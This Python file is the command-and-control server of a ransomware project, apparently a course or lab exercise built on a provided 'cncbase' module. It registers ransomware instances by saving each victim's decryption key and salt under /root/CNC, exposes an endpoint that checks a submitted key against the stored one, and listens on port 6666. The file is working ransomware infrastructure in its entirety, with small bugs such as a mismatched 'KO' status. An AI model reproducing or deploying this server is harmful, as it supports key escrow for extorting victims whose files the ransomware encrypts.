import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance

        key = base64.b64decode(body["key"])
        salt = base64.b64decode(body["salt"])
        token = base64.b64decode(body["token"])
        
        #cration of the directory
        os.makedirs('/root/CNC', exist_ok=True)
        folder_name = "/root/CNC/" + str(token.hex())

        os.makedirs(folder_name, exist_ok=True)

        with open(folder_name + "/key.bin", "wb") as file:
            file.write(key)
        with open(folder_name+"/salt.bin",'wb') as file:
            file.write(salt)

        return {"status":"KO"}

    def check_key_candidate(self,path:str, params:dict, body:dict)->dict:

        token = base64.b64decode(body['token'])
        folder_name = "/root/CNC/" + token.hex()
        key_file = folder_name + "/key.bin"

        key_candidate = base64.b64decode(body["key"])

        try:
            file = open(key_file, "rb")
            key = file.read()
            file.close()

            if key == key_candidate:
                return {"valide":1}
            else:
                return {"valide":0}

        except:
            file.close()
            return {"valide":0}

        

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()